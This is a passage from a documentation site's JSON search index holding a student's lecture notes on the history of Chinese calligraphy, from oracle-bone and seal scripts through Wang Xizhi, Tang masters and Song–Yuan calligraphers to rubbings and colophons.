<li> <p>\u4e66\u6cd5\u7684\u5a92\u4ecb\u548c\u5de5\u5177 \u2014\u2014\u6587\u623f\u56db\u5b9d </p> </li> <li> <p>\u6bdb\u7b14\uff1a\u5206\u4e3a\u6709\u5fc3\u65e0\u5fc3\u7b14\uff08\u65e0\u5fc3\u7b14\u5373\u4e0d\u523b\u610f\u6536\u675f\u7b14\u5fc3\uff0c\u53ea\u5728\u539f\u6765\u7684\u57fa\u7840\u4e0a\u5c06\u7b14\u5934\u53d8\u5927\uff09\uff1b\u7f8a\u6beb\u8f6f\uff0c\u72fc\u6beb\u662f\u9ec4\u9f20\u72fc \u786c \uff0c\u517c\u6beb\uff0c\u90fd\u6709</p> </li> <li>\u58a8\uff1a \u4e00\u822c\u90fd\u662f\u5fbd\u58a8</li> <li>\u7eb8\uff1a\u5ba3\u7eb8\uff0c\u6709\u751f\u5ba3\uff0c\u719f\u5ba3     \u200b\u200b</li> <li>\u781a \uff1a \u6b59\u781a\u3001\u7aef\u781a\u7b49</li> </ul>"},{"location":"ZJU-course/%E9%80%9A%E8%AF%86%E8%AF%BE%E7%A8%8B/%E4%B8%AD%E5%9B%BD%E4%B9%A6%E6%B3%95%E5%8F%B2/%E4%B8%AD%E5%9B%BD%E4%B9%A6%E6%B3%95%E5%8F%B2/#_4","title":"\u4ece\u5b57\u4f53\u5230\u4e66\u4f53\uff1a\u738b\u7fb2\u4e4b\u4ee5\u524d\u7684\u4e66\u6cd5\uff08\u7532\u9aa8\u6587\uff0c\u91d1\u6587\uff0c\u5c0f\u7bc6\uff0c\u96b6\u4e66\uff09","text":"<ul> <li> <p>\u5b57\u4f53\uff08\u7bc6\u4e66\uff0c\u96b6\u4e66\u7b49\u7b49\uff09\u548c\u4e66\u4f53\uff08\u989c\u4f53\uff0c\u6b27\u4f53\u7b49\u7b49\u4e0e\u4e2a\u4eba\u98ce\u683c\u6709\u5173\uff09</p> </li> <li> <p>\u5b57\u4f53\u662f\u6307\u7bc6\u4e66\uff0c\u96b6\u4e66\u7b49\uff0c\u6709\u57fa\u672c\u7684\u4f53\u5f0f\u89c4\u5b9a\uff0c\u6709\u666e\u904d\u7684\u89c4\u8303\u6027\u548c\u81ea\u5df1\u7684\u5ba1\u7f8e\u7279\u5f81</p> </li> <li>\u4e66\u4f53\u6587\u5b57\u6f14\u53d8\u7ed3\u675f\u540e\uff0c\u4e66\u5199\u8005\u4e3a\u4e86\u8ffd\u6c42\u4e2a\u4eba\u98ce\u683c\u800c\u5f62\u6210\u7684\u5177\u6709\u5f3a\u70c8\u8fa8\u8bc6\u5ea6\u7684\u4f53\u6001\u7279\u5f81\uff0c\u548c\u98ce\u683c\u76f8\u5173\uff0c\u4f8b\u5982\u6b27\u4f53\uff0c\u989c\u4f53\u7b49</li> <li> <p>\u7532\u9aa8\u6587  \u5728\u5546\u4ee3\u7684\u5360\u535c\u6d3b\u52a8\u4e2d\uff0c\u7531\u8d1e\u4eba\u9532\u523b\u4e8e\u9f9f\u7532\u3001\u517d\u9aa8\u4e0a\u7684\u6587\u5b57\uff0c\u662f\u4e2d\u56fd\u6700\u53e4\u8001\u7684\u6587\u5b57\u3002 </p> </li> <li> <p>\u591a\u6570\u60c5\u51b5\u4e0b\u662f\u5148\u4e66\u540e\u523b\uff0c\u6750\u6599\u548c\u9532\u523b\u6280\u672f\uff0c\u5f71\u54cd\u5230\u4e86\u7532\u9aa8\u6587\u7b80\u76f4\uff0c\u7626\u52b2\u7684\u98ce\u683c</p> </li> <li>\u8bb0\u5f55\u5360\u535c\u7ed3\u679c</li> <li> <p>\u91d1\u6587\uff08\u949f\u9f0e\u6587\uff09 \u5546\u5468\u65f6\u671f\u5728\u9752\u94dc\u796d\u793c\u5668\u4e0a\u7684\u94ed\u6587\uff0c\u5c5e\u4e8e\u5927\u7bc6\u7cfb\u7edf</p> </li> <li> <p>\u662f\u94f8\u9020\u51fa\u6765\u7684\uff0c\u7ae0\u6cd5\u6bd4\u8f83\u9519\u843d\uff0c\u5b57\u5f62\u4e0a\u5927\u5c0f\u4e0d\u4e00\uff0c\u7ebf\u6761\u7c97\u7ec6\u4e0d\u4e00\uff0c\u56e0\u4e3a\u94f8\u9020\u5de5\u827a\u800c\u663e\u5f97\u5706\u8f6c\u539a\u91cd</p> </li> <li>\u6b4c\u9882\u7956\u5148\uff0c\u738b\u4faf\u529f\u7ee9</li> <li> <p>\u7bc6\u5f15*  \u753b\u51fa\u4e00\u4e2a\u7ebf\u6761\uff0c\u753b\u51fa\u5300\u51c0\u3001\u5706\u8f6c\u800c\u5e84\u4e25\u7684\u7ebf\u6761\uff0c\u5373\u7528\u6bdb\u7b14\u753b\u51fa\u70b9\u753b\u548c\u7ed3\u6784\u3002\u4f7f\u5f97\u6587\u5b57\u4ece\u8c61\u5f62\u8f6c\u5411\u7b26\u53f7\u5316\uff0c\u6446\u8131\u4e86\u56fe\u753b\u7684\u5f71\u54cd\uff0c\u6210\u4e3a\u4e86\u65b9\u4fbf\u8bb0\u5fc6\u548c\u4e66\u5199\u7684\u6587\u5b57</p> </li> <li> <p>\u753b\u5fc5\u987b\u5199\uff0c\u5b57\u5374\u4e0d\u53ef\u753b\u3002</p> </li> <li> <p>\u5c0f\u7bc6\u548c\u79e6\u4ee3\u4e66\u540c\u6587 \u6625\u79cb\u6218\u56fd\u4e2d\u516d\u56fd\u7684\u6587\u5b57\u7edf\u4e00\u79f0\u4e3a\u53e4\u6587\uff0c\u7edf\u4e00\u516d\u56fd\u540e\uff0c\u79e6\u671d\u63a8\u884c\u4e66\u540c\u6587\uff0c\u8f6c\u5411\u5c0f\u7bc6</p> </li> <li> <p>\u5c0f\u7bc6\u7684\u7279\u70b9\u89c4\u6574\uff0c\u5a49\u8f6c\uff0c\u901a\u7545\uff0c\u5300\u52b2\u7684\u7279\u70b9\uff0c\u7528\u7b14\u53d8\u5f97\u89c4\u6574  \u7bc6\u4e66\u5927\u5bb6\uff08\u6e05\u9093\uff09</p> </li> <li> <p>\u79e6\u6c49\u65f6\u671f\u53d1\u751f\u4e86\u96b6\u53d8 \u4ece\u79e6\u4ee3\u5f00\u59cb\u5728\u65e5\u5e38\u4e66\u5199\u4e2d\u51fa\u73b0\u4e86\u96b6\u4e66\uff0c\u7bc6\u4e66\u5411\u96b6\u4e66\u8f6c\u53d8\u7684\u8fc7\u7a0b\u79f0\u4e3a\u96b6\u53d8</p> </li> <li> <p>\u5c31\u662f\u7b80\u5316\u4e86\u7bc6\u4e66\u7684\u5f62\u6001\uff0c\u5316\u7e41\u4e3a\u7b80\uff0c\u5316\u5706\u4e3a\u65b9\uff0c\u7eb5\u52bf\u529b\u4e5f\u8f6c\u53d8\u4e3a\u6a2a\u52bf\uff08\u53d8\u6241\u5e73\u4e86\uff09\uff0c\u5e76\u4ea7\u751f\u65b0\u7684\u90e8\u9996\u504f\u65c1\u548c\u7b14\u753b\uff08\u5982\u6487\u637a\uff09</p> </li> <li>\u4f7f\u7528\u66f4\u52a0\u7b80\u4fbf\uff0c\u6587\u5b57\u8fdb\u5165\u4e86\u4eca\u6587\u5b57\u65f6\u4ee3\uff0c\u6c49\u5b57\u4e0e\u73b0\u4ee3\u7684\u6c49\u5b57\u76f8\u4f3c</li> <li>\u5927\u7bc6\u5c0f\u7bc6\u90fd\u662f\u53e4\u6587\u5b57\uff0c\u96b6\u53d8\u662f\u6807\u5fd7\u7740\u53e4\u6c49\u5b57\u6f14\u53d8\u4e3a\u73b0\u4ee3\u6c49\u5b57\u7684\u8d77\u70b9</li> <li> <p>\u96b6\u5b9a* </p> </li> <li> <p>\u200b\u200b</p> </li> <li> <p>\u6c49\u4ee3\u7891\u523b\uff08\u77f3\u523b\uff09\u4e66\u6cd5</p> </li> <li> <p>\u7891\u523b\u53ef\u80fd\u662f\u5728\u7891\u4e0a\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u5728\u5c71\u4e0a\u627e\u4e00\u5757\u77f3\u5934</p> </li> <li>\u4e1c\u6c49\u7891\u78a3\u6210\u98ce\u7684\u539f\u56e0\uff1a\u539a\u846c\uff0c\u6ce8\u91cd\u4eba\u54c1\uff0c\u201c\u4e3e\u5b5d\u5ec9\u201d\u7684\u63a8\u4e3e\u4eba\u624d\u7684\u673a\u5236\uff08\u7ad6\u7891\u7acb\u4f20\uff09</li> <li>\u66f9\u64cd\u7981\u7891\uff1a\u6c49\u672b\u6c11\u4e0d\u804a\u751f</li> <li> <p>\u9b4f\u664b\u5357\u5317\u671d\u7684\u7891\u523b</p> </li> <li> <p>\u5317\u7891\u662f\u6307\u5317\u671d\u7684\u6587\u5b57\u523b\u77f3\u7684\u7edf\u79f0</p> </li> <li>\u9b4f\u7891\uff0c\u662f\u5317\u9b4f\u7684\u6587\u5b57\u523b\u77f3\uff0c\u5317\u9b4f\u662f\u5317\u671d\u4e2d\u7891\u523b\u4e4b\u6700\uff0c\u4e0a\u627f\u6c49\u96b6\uff0c\u4e0b\u542f\u5510\u6977</li> <li>\u5317\u7891\uff0c\u9b4f\u7891\uff0c\u7891\u5b66\uff0c\u65e0\u540d\u6c0f\u4e66\u523b\u9057\u8ff9\u7b49\u6982\u5ff5\u90fd\u662f\u6e05\u4ee3\u5f62\u6210\u7684</li> <li>\u94ed\u77f3\u4f53 \u7891\u523b\uff0c\u9752\u94dc\u5668\uff0c\u5728\u6587\u5b57\u5f62\u6001\u4e0a\u6709\u6ede\u540e\u6027\uff08\u5728\u65b0\u7684\u4e66\u4f53\u548c\u4e66\u6cd5\u98ce\u5c1a\u6d41\u884c\u7684\u65f6\u5019\uff0c\u94ed\u77f3\u4f53\u5e38\u5e38\u4ecd\u4f7f\u7528\u66f4\u53e4\u8001\u7684\u4e66\u5199\u548c\u520a\u523b\u5f62\u5f0f\uff09\uff0c\u56e0\u4e3a\u9700\u8981\u522b\u4eba\u523b\u4e0a\u53bb \u6bd4\u8f83\u5e84\u91cd\u7a33\u5065</li> <li>\u200b\u200b</li> <li>\u624b\u5199\u4f53 \u65e5\u5e38\u7684\u4e66\u5199\u4e8e\u7eb8\u5f20\uff0c\u7ee2\u5e1b\uff0c\u7af9\u6728\u7b49\u4e0a\u7684\u4e66\u6cd5\u4f5c\u54c1\uff0c\u4e00\u822c\u662f\u65e5\u5e38\u7684\u529f\u80fd\u6027\u4e66\u5199\uff0c\u6bd4\u5982\u516c\u6587\uff0c\u65e5\u8bb0\u7b49\uff0c\u901a\u5e38\u6bd4\u8f83\u7387\u610f</li> <li>\u200b\u200b</li> </ul>"},{"location":"ZJU-course/%E9%80%9A%E8%AF%86%E8%AF%BE%E7%A8%8B/%E4%B8%AD%E5%9B%BD%E4%B9%A6%E6%B3%95%E5%8F%B2/%E4%B8%AD%E5%9B%BD%E4%B9%A6%E6%B3%95%E5%8F%B2/#_5","title":"\u4ece\u4e1c\u664b\u738b\u7fb2\u4e4b\u5230\u5510\u4ee3\u8bf8\u5bb6  \u884c\u4e66\uff0c\u8349\u4e66\uff0c\u6977\u4e66\uff08\u7ecf\u5178\u7684\u5f62\u6210\uff09","text":"<ul> <li> <p>\u7ae0\u8349 </p> </li> <li> <p>\u66f9\u9b4f\uff0c\u897f\u664b\u65f6\u671f\u7684\u8349\u4e66\uff0c\u6709\u4e00\u5b9a\u7a0b\u5f0f\u5316\u7684\u8349\u4e66\uff0c\u8349\u5199\u7684\u96b6\u4e66</p> </li> <li>\u7279\u70b9\u662f\u5b57\u4e2d\u6709\u8fde\u7b14\uff0c\u4f46\u662f\u5b57\u4e0e\u5b57\u4e4b\u95f4\u4e0d\u7275\u8fde\uff0c\u4ecd\u6709\u96b6\u4e66\u7279\u70b9\u6ce2\u78d4\u3002</li> <li>\u5728\u738b\u7fb2\u4e4b\u4e4b\u524d \u8349\u4e66\u6bd4\u8f83\u65e9\u7684\u7c7b\u578b\uff0c\u6709\u96b6\u4e66\u7279\u70b9\u5c24\u5176\u662f\u637a\u7b14\uff0c\u6bd4\u8f83\u6241\u5e73</li> <li> <p>\u4eca\u8349\uff08\u5c0f\u8349\uff09</p> </li> <li> <p>\u6c49\u672b\u5f00\u59cb\uff0c\u5bf9\u7ae0\u8349\u7684\u9769\u65b0\uff0c\u7531\u4e1c\u6c49\u5f20\u829d\uff08\u8349\u5723\uff09\u6240\u521b\uff0c\u5230\u738b\u7fb2\u4e4b\u6210\u719f</p> </li> <li>\u96b6\u4e66\u7279\u70b9\u6d88\u5931\uff0c\u5b57\u4e0e\u5b57\u4e4b\u95f4\u6709\u7275\u8fde\uff0c\u6ce2\u78d4\u6d88\u5931</li> <li> <p>\u4e8c\u738b\u7684\u8d21\u732e\u548c\u5730\u4f4d \u4ece\u4ed6\u4eec\u5f00\u59cb\uff0c\u8fdb\u5165\u4eca\u4f53\uff08\u65b0\u4f53\uff09</p> </li> <li> <p>\u738b\u7fb2\u4e4b\u88ab\u79f0\u4e3a\u4e66\u5723\uff0c\u300a\u5170\u4ead\u5e8f\u300b\u88ab\u79f0\u4e3a\u5929\u4e0b\u7b2c\u4e00\u884c\u4e66</p> </li> <li>\u4e8c\u738b\u5728\u6977\u4e66\uff0c\u884c\u4e66\uff0c\u8349\u4e66\u4e0a\u90fd\u6709\u91cd\u8981\u8d21\u732e\uff0c\u98ce\u683c\u7cbe\u81f4\u6d41\u7545</li> <li> <p>\u738b\u7fb2\u4e4b\u65b0\u4f53\u7684\u7279\u70b9 \u91cd\u8981</p> </li> <li> <p>\u7528\u7b14\u65b9\u9762\u201c\u4e00\u62d3\u4e4b\u4e0b\u201d\uff0c\u662f\u8d75\u5b5f\u982b\u5bf9\u738b\u7fb2\u4e4b\u7684\u603b\u7ed3\uff1b\u6539\u53d8\u4e86\u6c49\u9b4f\u65e7\u6cd5\uff0c\u7528\u7b14\u7b80\u7ec3\u660e\u5feb\uff0c\u66f4\u5f3a\u8c03\u4fa7\u950b\u6ed1\u884c\u7684\u8fd0\u7528\u548c\u8282\u594f\u611f\uff0c\u4e30\u5bcc\u4e86\u70b9\u753b\u5f62\u6001\uff0c\u66f4\u5177\u97f5\u5f8b\u611f\uff0c\u7231\u598d\u800c\u8584\u8d28\u201d\u4fa7\u950b\u591a\u5219\u598d\u7f8e\uff0c\u51fa\u73b0\u4e86\u5b57\u7ec4\uff0c\u5c31\u662f\u8fde\u7b14\u8f83\u591a\u7684\u4e00\u7ec4\u5b57</p> </li> <li>\u7ed3\u6784\u65b9\u9762\uff0c\u5728\u504f\u65c1\u90e8\u4ef6\u4e0a\u5f62\u6210\u4e86\u5927\u5c0f\u3001\u9ad8\u4f4e\u3001\u504f\u6b63\u7684\u5173\u7cfb\u3002</li> <li>\u7ae0\u6cd5\u65b9\u9762\uff0c\u7eb5\u5411\u7b14\u52bf\u7684\u6269\u5f20\uff0c\u5b57\u4e0e\u5b57\u4e4b\u95f4\u6709\u52fe\u8fde\uff0c\u7a81\u7834\u4e86\u4ee5\u5f80\u8349\u4e66\u3001\u884c\u4e66\u4ee5\u5355\u5b57\u4e3a\u9020\u578b\u5355\u4f4d\u7684\u9650\u5236\uff0c\u51fa\u73b0\u4e86\u5b57\u7fa4\uff08\u5b57\u7ec4\uff09\u5173\u7cfb\uff0c\u4e0d\u4ec5\u5355\u5b57\u7684\u70b9\u753b\u4e4b\u95f4\u5173\u7cfb\u66f4\u4e3a\u8fde\u7ef5\uff0c\u5b57\u4e0e\u5b57\u4e4b\u95f4\u3001\u884c\u4e0e\u884c\u4e4b\u95f4\u4e5f\u66f4\u6709\u547c\u5e94\u3002</li> <li> <p>\u53e4\u4eca\u65b0\u65e7\u7684\u6982\u5ff5*</p> </li> <li> <p>\u200b\u200b</p> </li> <li> <p>\u72c2\u8349 </p> </li> <li> <p>\u5510\u4ee3\u5f20\u65ed\uff0c\u6000\u7d20\u7b49\u4eba\u53d1\u5c55\u7684\u4e00\u79cd\u8349\u4e66\u6837\u5f0f</p> </li> <li>\u8fde\u7ef5\u800c\u6063\u8086\uff0c\u6700\u5177\u62bd\u8c61\u6027\u548c\u8868\u73b0\u6027\u7684\u4e66\u4f53</li> <li>\u5185\u5fc3\u7684\u559c\u6012\u54c0\u4e50\u53ef\u4ee5\u501f\u6b64\u4e66\u6cd5\uff0c\u5bf9\u4e8e\u5916\u7269\u7684\u89c2\u7167\u4e5f\u53ef\u4ee5\u501f\u6b64\u4f53\u73b0</li> <li> <p>\u98a0\u5f20\u9189\u7d20</p> </li> <li> <p>\u662f\u6307\u5f20\u65ed\u548c\u6000\u7d20\uff0c\u4e24\u4eba\u90fd\u64c5\u957f\u72c2\u8349\uff0c\u5e76\u4e14\u6027\u60c5\u6063\u653e\u95fb\u540d</p> </li> <li>\u5f20\u65ed\u5728\u4e8c\u738b\u4f20\u7edf\u7684\u8349\u4e66\u57fa\u7840\u4e0a\u5f00\u521b\u65b0\u683c\uff0c\u5f00\u521b\u72c2\u8349\u4e4b\u5148\u6cb3\uff0c\u88ab\u8a89\u4e3a\u8349\u5723</li> <li> <p>\u6000\u7d20\uff0c\u4eba\u79f0\u9189\u50e7\uff0c\u548c\u5f20\u65ed\u5171\u540c\u521b\u9020\u4e86\u4e2d\u56fd\u8349\u4e66\u4e66\u6cd5\u7684\u53c8\u4e00\u9ad8\u5cf0</p> </li> <li> <p>\u5510\u4ee3\u7684\u6977\u4e66\u7cfb\u7edf \u521d\u5510\u56db\u5bb6+\u76db\u5510\u989c\u67f3</p> </li> <li> <p>\u989c\u7b4b\uff08\u5185\u5728\uff09\u67f3\u9aa8\uff08\u5916\u5728\uff09</p> </li> <li> <p>\u8fd9\u4e2a\u8bf4\u6cd5\u662f\u6307\u989c\u771f\u537f\u548c\u67f3\u516c\u6743\u7684\u6977\u4e66\u98ce\u683c</p> </li> <li>\u989c\u771f\u537f\u7684\u6977\u4e66\u6d51\u539a\u535a\u5927\uff0c\u5706\u6d51\u9052\u52b2\uff0c\u7cbe\u795e\u5185\u8574\uff0c\u6c14\u8c61\u5b8f\u5927\uff0c\u96c4\u6d51\u5206\u5272</li> <li>\u67f3\u516c\u6743\u662f\u5f3a\u8c03\u5916\u9732\u7684\u9aa8\u529b\uff0c\u6e05\u52b2\u9052\u7f8e\u7684\u98ce\u683c\uff0c\u7626\u52b2\uff0c\u5c06\u4e66\u6cd5\u4f5c\u54c1\u6bd4\u4f5c\u4eba</li> <li>\u7b4b\u9aa8\u662f\u65e9\u671f\u4e66\u6cd5\u7406\u8bba\u4e2d\u7684\u91cd\u8981\u8303\u7574\uff0c\u4e8c\u8005\u5206\u522b\u6307\u5411\u5185\u5728\u4e0e\u5916\u5728\u7684\u529b\u91cf\u611f\u3002</li> <li> <p>\u54cd\u62d3</p> </li> <li> <p>\u662f\u6307\u516d\u671d\u5230\u521d\u5510\u7684\u590d\u5236\u4e66\u6cd5\u7684\u65b9\u6cd5\uff0c\u501f\u52a9\u65e5\u5149\uff0c\u4eba\u4eec\u6784\u6479\u5b57\u5f62\u7684\u5916\u8f6e\u5ed3\u5e76\u4e14\u7ec6\u5fc3\u5730\u586b\u58a8</p> </li> <li> <p>\u5510\u4ee3\u4e66\u8bba  \u5173\u4e8e\u4e66\u6cd5\u7684\u7406\u8bba\u8457\u4f5c\uff0c\u6bd4\u5982\u5b59\u8fc7\u5ead\u7684\u4e66\u8c31\uff0c\u4e0d\u4ec5\u662f\u4e66\u6cd5\u4f5c\u54c1\uff0c\u4e5f\u662f\u4e66\u6cd5\u7406\u8bba\u4f5c\u54c1</p> </li> <li> <p>\u70b9\u753b\u548c\u4f7f\u8f6c</p> </li> <li>\u4ee5\u738b\u7fb2\u4e4b\u4e3a\u6838\u5fc3\uff0c\u79f0\u4e3a\u5e16\u5b66</li> <li>\u7ecf\u5178\u7684\u5f62\u6210\uff0c\u4ec0\u4e48\u662f\u7ecf\u5178\uff0c\u7ecf\u5178\u662f\u4ec0\u4e48\u65f6\u5019\u5f62\u6210\u7684</li> </ul>"},{"location":"ZJU-course/%E9%80%9A%E8%AF%86%E8%AF%BE%E7%A8%8B/%E4%B8%AD%E5%9B%BD%E4%B9%A6%E6%B3%95%E5%8F%B2/%E4%B8%AD%E5%9B%BD%E4%B9%A6%E6%B3%95%E5%8F%B2/#_6","title":"\u590d\u5236\u3001\u4fe1\u672d\u3001\u9898\u8dcb\uff1a\u5b8b\u5143\u65f6\u671f\u7684\u4e66\u6cd5","text":"<ul> <li> <p>\u5b8b\u56db\u5bb6 \u64c5\u957f\u884c\u4e66 \u662f\u8c01</p> </li> <li> <p>\u82cf\u4e1c\u5761 \u5d07\u5c1a\u610f\u9020 \u5199\u5b57\u81ea\u7136 \u6241\u5e73 \u201c\u6211\u4e66\u610f\u9020\u672c\u65e0\u6cd5\uff0c\u70b9\u753b\u4fe1\u624b\u70e6\u63a8\u6c42\u3002\u201d\uff0c\u5d07\u5c1a\u4e2a\u4eba\u9886\u609f\uff0c\u4e0d\u6c42\u5b8c\u7f8e\u548c\u7cbe\u5de5</p> <ul> <li>\u200b\u200b</li> <li>\u9ec4\u5ead\u575a  \u5c06\u201c\u62d9\u201d\u4f5c\u4e3a\u8ffd\u6c42\uff0c\u5e76\u4e14\u7eb3\u5165\u96c5\u4fd7\u89c2\u5ff5 \u8038\u80a9\u5b57\uff0c\u6709\u70b9\u659c \u4e5f\u64c5\u957f\u8349\u4e66 \u7626\u957f  \u201c\u51e1\u75c5\u7686\u53ef\u533b\uff0c\u60df\u4fd7\u4e0d\u53ef\u533b\u3002\u201d\u201c\u96c5\u4fd7\u201d\u89c2\u5ff5\u8fdb\u5165\u5230\u4e86\u4e66\u6cd5\u7684\u54c1\u8bc4</li> </ul> <p>\u8bed\u8a00\u4e2d\u3002   * \u7c73\u82be  \u4e2a\u6027\u5f3a\u70c8\uff0c\u5178\u6545\u9887\u591a\uff0c\u4e66\u8bba\u65b9\u9762\u4f5c\u54c1\u5f88\u591a  \u8fd0\u7b14\u723d\u5229\uff0c\u6709\u4e00\u5b9a\u7684\u901f\u5ea6\uff0c\u6bdb\u7b14\u638c\u63e1</p> <ul> <li>\u200b\u200b</li> <li>\u8521\u8944  \u4e0e\u5510\u4ee3\u4f20\u7edf\u8d34\u8fd1\uff0c\u4e0e\u989c\u771f\u537f\u4e66\u6cd5\u8054\u7cfb\u7d27\u5bc6\uff0c\u811a\u6c14\u8d34-&gt;\u8eab\u4f53\u72b6\u6001</li> <li>\u5b8b\u56db\u5bb6\u91cd\u65b0\u5efa\u6784\u4e66\u6cd5\u7684\u4f20\u7edf\uff0c\u4e5f\u7a81\u7834\u4e86\u4f20\u7edf\u7684\u7981\u9522</li> <li>\u5b8b\u4eba\u5c1a\u610f</li> </ul> </li> <li> <p>\u4ee5\u5b8b\u56db\u5bb6\u4e3a\u4ee3\u8868\u7684\u5b8b\u4ee3\u4e66\u6cd5\u5bb6\u53d1\u5c55\u51fa\u7684\u4e00\u79cd\uff0c\u4ee5\u8868\u73b0\u4e2a\u4f53\u60c5\u611f\u4e0e\u610f\u8da3\u7684\u4e66\u5199\u503e\u5411\uff0c\u4e0e\u5510\u4ee3\u4eba\u8c28\u5b88\u4e25\u683c\u7684\u6cd5\u5ea6\uff0c\u5f3a\u8c03\u5e08\u627f\u5bb6\u6cd5\uff0c\u76f8\u6620\u6210\u8da3\u3002</p> </li> <li>\u82cf\u8f7c\u662f\u4e66\u6cd5\u5c1a\u610f\u7684\u9886\u8896\uff0c\u4e66\u6cd5\u5c55\u73b0\u51fa\u4e00\u79cd\u4efb\u6027\u9002\u60c5\u7684\u81ea\u7531</li> <li>\u91cd\u5efa\u4e86\u4e66\u6cd5\u7684\u4f20\u7edf\uff0c\u7a81\u7834\u4e86\u5510\u4eba\u7684\u85e9\u7bf1\uff0c\u8d70\u4e0a\u4e00\u6761\u65b0\u8def\uff0c\u4e66\u6cd5\u5c55\u73b0\u51fa\u4e00\u79cd\u4efb\u6027\u9002\u60c5\u7684\u81ea\u7531</li> <li> <p>\u5143\u4ee3 \u8d75\u5b5f\u982b \u6977\u4e66\u56db\u5927\u5bb6\u4e4b\u4e00  \u6b27\u989c\u67f3\u8d75</p> </li> <li> <p>\u6bcf\u65e5\u52e4\u594b\u4e8e\u7ec3\u7b14</p> </li> <li>\u5d07\u5c1a\u664b\u5510\u4e66\u6cd5\uff0c\u4ee5\u590d\u53e4\u4e3a\u5df1\u4efb\uff0c\u5728\u5143\u4ee3\u5f15\u9886\u4e86\u590d\u53e4\u4e66\u98ce</li> <li> <p>\u6587\u4eba\u7684\u827a\u672f\uff0c\u6587\u4eba\u5bf9\u4e66\u6cd5\u7684\u8bdd\u8bed\u6743</p> </li> <li> <p>\u4e2d\u56fd\u4e66\u6cd5\u4e2d\u6587\u4eba\u7684\u8bdd\u8bed\u6743\uff0c\u4e66\u5377\u6c14\u662f\u6307\u4e66\u6cd5\u5bb6\u6587\u5316\u7d20\u517b\u9ad8\u4f4e\u5728\u4e66\u6cd5\u4f5c\u54c1\u4e0a\u7684\u4f53\u73b0</p> </li> <li>\u5b8b\u4ee3\u4ee5\u524d\uff0c\u4e66\u6cd5\u7684\u4f20\u627f\u4e00\u76f4\u5728\u4e16\u5bb6\u5185\u90e8\u4f20\u627f\uff0c\u5510\u4ee3\u56e0\u4e3a\u6218\u4e71\u800c\u5bfc\u81f4\u95e8\u9600\u5d29\u6e83\uff0c\u4e66\u6cd5\u51cb\u655d</li> <li>\u5b8b\u4ee3\u4ee5\u6765\uff0c\u6b27\u9633\u4fee\uff0c\u82cf\u8f7c\uff0c\u9ec4\u5ead\u575a\u7b49\u4eba\u5f00\u59cb\u5bf9\u4e66\u6cd5\u91cd\u65b0\u5b9a\u4e49\uff0c\u8ba4\u5b9a\u5176\u4e3a\u6587\u4eba\u7684\u6280\u672f</li> <li>\u4e00\u4e2a\u4e66\u5bb6\u5982\u679c\u6ca1\u6709\u4e30\u539a\u7684\u5b66\u517b\uff0c\u90a3\u4e48\u5373\u4fbf\u4e66\u6cd5\u529f\u529b\u518d\u6df1\u539a\uff0c\u4e5f\u65e0\u6cd5\u8dfb\u8eab\u9057\u7559\u4e66\u5bb6\uff0c\u4ee5\u53ca\u4eba\u54c1\u5bf9\u4e8e\u4e66\u54c1\u7684\u8054\u7cfb</li> <li>\u8fd9\u79cd\u5b66\u517b\u88ab\u79f0\u4e3a\u4e66\u5377\u6c14</li> <li> <p>\u4e66\u5377\u6c14</p> </li> <li> <p>\u200b\u200b</p> </li> <li> <p>\u9898\u8dcb\uff1a</p> </li> <li> <p>\u5728\u8fd9\u4e00\u65f6\u671f\u53d8\u5f97\u7e41\u76db\uff0c\u62d3\u672c\u4e0e\u5b66\u672f\u6d3b\u52a8\u6709\u5173\uff0c\u9898\u8dcb\u4e5f\u6210\u4e3a\u753b\u9762\u7684\u4e00\u90e8\u5206\u9ec4\u5ead\u575a\u8dcb\u300axxx\u300b\u82cf\u9ec4\u4e24\u4eba\u4e92\u76f8\u5410\u69fd\u5b57\u4f53</p> </li> <li>\u5728\u4e66\u6cd5\uff0c\u7ed8\u753b\uff0c\u62d3\u672c\u4e0a\u9898\u5199\u7684\u6587\u5b57\uff0c\u4e66\u753b\u9898\u8dcb\u5927\u591a\u6d89\u53ca\u9274\u5b9a\u3001\u9012\u85cf\u4e0e\u6b23\u8d4f\uff0c\u62d3\u672c\u5219\u5e38\u5e38\u8fd8\u4e0e\u91ca\u6587\u53ca\u5b66\u672f\u8003\u8bc1\u6709\u5173\u3002</li> <li>\u5728\u5386\u53f2\u53d1\u5c55\u4e4b\u4e2d\uff0c\u8fd9\u4e9b\u9898\u8dcb\u4e5f\u79f0\u4e3a\u4e86\u539f\u4f5c\u7684\u4e00\u90e8\u5206\uff0c\u662f\u4e2d\u56fd\u827a\u672f\u7279\u6709\u7684\u6837\u5f0f</li> <li>\u786c\u633a\u7684\u7b14\u950b\uff0c\u5199\u51fa\u4e1d\u72b6\u7684\u5b57</li> <li>20:04\u65f6\u523b\u7684\u5185\u5bb9</li> <li> <p>\u523b\u5e16 </p> </li> <li> <p>\u662f\u4e00\u79cd\u590d\u5236\u7684\u65b9\u5f0f\uff0c\u5c06\u664b\u5510\u4e66\u6cd5\u7684\u539f\u4f5c\u94a9\u6479\u4e0a\u6728\uff08\u6216\u77f3\uff09\uff0c\u7ecf\u8fc7\u520a\u523b\u3001\u690e\u62d3\uff0c\u83b7\u5f97\u7684\u62d3\u7247\u5c31\u662f\u523b\u5e16</p> </li> <li>\u5b8b\u4ee5\u540e\uff0c\u523b\u5e16\u662f\u5b66\u4e60\u4e66\u6cd5\u7684\u4e3b\u8981\u8303\u672c</li> <li>\u4f7f\u5f97\u4e66\u6cd5\u540d\u4f5c\u5316\u8eab\u5343\u4e07</li> <li>\u6709\u4e00\u4e9b\u5f0a\u7aef\uff0c\u7f16\u6392\u7684\u4eba\u4f1a\u628a\u540e\u4eba\u4f2a\u9020\u7684\u4e1c\u897f\u52a0\u5165\uff0c\u4f2a\u9020\u7684\u5e16\u5b50\u8fdb\u5165\uff0c\u5931\u771f\u8d70\u6837\uff0c\u4e0d\u591f\u7cbe\u81f4</li> <li> <p>\u5e16\u5b66</p> </li> <li> <p>\u662f\u6307\u5b66\u4e60\u4e8c\u738b\u7236\u5b50\u4e3a\u4e2d\u5fc3\u7684\u664b\u5510\u540d\u5bb6\u7684\u4e66\u6cd5\u4e3a\u53d6\u6cd5\u5bf9\u8c61\u7684\u5b66\u4e66\u9014\u5f84\u4e00\u76f4\u7ef5\u5ef6\uff0c\u5230\u4e86\u6e05\u4ee3\u7891\u5b66\u51fa\u73b0\u4e4b\u540e\uff0c\u76f8\u5bf9\u7684\u5c31\u79f0\u4e3a\u5e16\u5b66</p> </li> <li>\u4e13\u6307\u5b66\u4e8c\u738b\uff0c\u4e3b\u8981\u662f\u884c\u8349\u4e66</li> 